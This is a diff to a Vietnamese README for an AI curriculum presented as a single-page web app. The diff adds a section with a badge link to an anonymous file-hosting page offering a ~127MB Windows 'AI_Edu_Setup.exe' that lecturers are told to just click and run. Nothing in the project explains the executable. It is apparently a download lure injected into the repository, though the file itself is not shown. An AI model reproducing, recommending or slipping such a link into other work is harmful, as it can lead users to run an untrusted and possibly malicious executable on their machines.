@@ -32,6 +32,19 @@ Giáo trình được xây dựng dưới dạng **ứng dụng web đơn trang 
 
 ---
 
+## 📥 Tải Xuống Ứng Dụng (Bản Đóng Gói .EXE)
+
+Tài liệu giáo trình đã được biên dịch và đóng gói hoàn chỉnh thành một phần mềm độc lập để giảng viên có thể tải về và chạy trực tiếp (**nhấn vào là chạy**) mà không cần cài đặt môi trường lập trình.
+
+<p align="center">
+  <a href="https://gofile.io/d/NUnBMJ" target="_blank">
+    <img src="https://img.shields.io/badge/Tải_Xuống_Ngay-AI__Edu__Setup.exe (%7E127MB)-28a745?style=for-the-badge&logo=windows&logoColor=white" alt="Download EXE" />
+  </a>
+</p>
+<p align="center"><em>*Phiên bản dành cho Windows 64-bit</em></p>
+
+---
+
 ## 🏗️ Cấu Trúc Giáo Trình
 
 Nội dung được chia thành **4 chương chính**, xoay quanh **Quy trình 5 Bước** xây dựng ứng dụng AI:
